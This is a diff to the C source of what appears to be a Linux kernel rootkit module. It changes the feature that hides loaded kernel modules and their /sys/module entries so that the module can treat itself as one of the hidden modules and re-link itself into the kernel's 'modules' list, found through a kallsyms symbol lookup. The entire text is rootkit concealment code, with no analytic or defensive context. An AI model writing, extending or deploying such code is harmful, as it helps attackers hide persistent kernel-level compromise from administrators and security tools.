@@ -68,6 +68,9 @@ static struct module *find_module_safe(const char *name)
 {
     struct module *mod;
 
+    if (strcmp(THIS_MODULE->name, name) == 0)
+        return THIS_MODULE;
+
     list_for_each_entry(mod, &THIS_MODULE->list, list) {
         if (mod == THIS_MODULE)
             continue; 
@@ -313,8 +316,18 @@ static int kernmod_remove_hidden_module(const char *name)
 
     list_for_each_entry_safe(entry, tmp, &hidden_modules, list) {
         if (strcmp(entry->name, name) == 0) {
-            list_add(&entry->mod->list, &THIS_MODULE->list);
-            
+            if (entry->mod == THIS_MODULE) {
+                struct list_head *modules_list = 
+                    (struct list_head *)kallsyms_lookup_name_fn("modules");
+                if (modules_list)
+                    list_add(&entry->mod->list, modules_list);
+                else
+                    goto skip_reinsert;
+            } else {
+                list_add(&entry->mod->list, &THIS_MODULE->list);
+            }
+
+skip_reinsert:
             snprintf(sysfs_path, sizeof(sysfs_path), "/sys/module/%s", name);
             kernmod_remove_hidden_file(sysfs_path);
 
